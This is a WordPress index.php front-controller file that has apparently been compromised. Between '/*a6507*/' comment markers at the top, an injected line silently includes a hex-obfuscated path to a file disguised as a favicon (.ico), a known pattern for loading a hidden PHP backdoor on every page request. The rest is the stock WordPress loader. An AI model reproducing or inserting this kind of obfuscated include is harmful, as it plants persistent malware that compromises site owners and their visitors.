<?php

/*a6507*/

@include "\x2fho\x6de3\x2fde\x6do4\x7ake\x2fpu\x62li\x63_h\x74ml\x2fde\x764/\x6dak\x65ha\x70pe\x6e/f\x61vi\x63on\x5ffc\x390e\x32.i\x63o";

/*a6507*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
